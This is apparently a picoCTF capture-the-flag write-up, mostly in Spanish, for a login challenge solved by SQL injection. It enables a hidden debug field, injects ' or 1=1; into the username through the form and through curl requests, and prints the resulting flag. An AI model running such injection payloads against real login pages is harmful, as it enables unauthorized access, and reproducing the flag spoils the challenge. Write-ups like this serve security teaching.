## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!

Hints
- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.
## Solucion
Inspeccionamos y encontramos un campo oculto el cual  mostramos.
```html
<input type="show" name="debug" value="1">
```
Esto nos permitira ver como se hace la consulta sql para ingresar.
```sql
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```
Intentamos una inyeccion sql que se veria de esta esta manera si ingresamos en el campo de admin ' or 1=1;
``` sql
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'
```
Y obtenemos la bandera:
Your flag is: picoCTF{s0m3_SQL_c218b685}

## Solucion 2

```bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d 'username=admin&password=admin'
<h1>Login failed.</h1>
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d 'username=admin&password=admin&debug=1'
<pre>username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
</pre><h1>Login failed.</h1>
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=' or 1=1;&password=admin&debug=1"
<pre>username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$
```
## Notas adicionales
## Referencias
- [SQL injection - Wikipedia](https://en.wikipedia.org/wiki/SQL_injection#:~:text=In%20computing%2C%20SQL%20injection%20is,database%20contents%20to%20the%20attacker).
- [SQL Injection (w3schools.com)](https://www.w3schools.com/sql/sql_injection.asp)